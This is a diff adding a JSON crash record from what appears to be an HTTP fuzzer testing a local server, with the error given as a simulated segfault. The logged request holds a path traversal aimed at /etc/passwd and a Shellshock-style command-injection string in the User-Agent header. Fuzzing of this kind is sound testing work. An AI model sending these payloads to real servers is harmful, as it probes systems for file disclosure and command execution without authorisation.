@@ -1,0 +1,22 @@
+{
+  "timestamp": "2025-12-29T14:42:21.269047",
+  "crash_type": "segfault",
+  "payload": "HEAD /cgi-bin/../../../../etc/passwd?\nHeaders: {'User-Agent': '() { :; }; echo vulnerable', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Original-Url': 'X-HTTP2-Continuation: true', 'X-Http-Method-Override': '4294967295'}",
+  "payload_hash": "db9fa125879772b0",
+  "request_method": "HEAD",
+  "request_path": "/cgi-bin/../../../../etc/passwd?",
+  "request_headers": {
+    "User-Agent": "() { :; }; echo vulnerable",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Original-Url": "X-HTTP2-Continuation: true",
+    "X-Http-Method-Override": "4294967295"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 623
+}
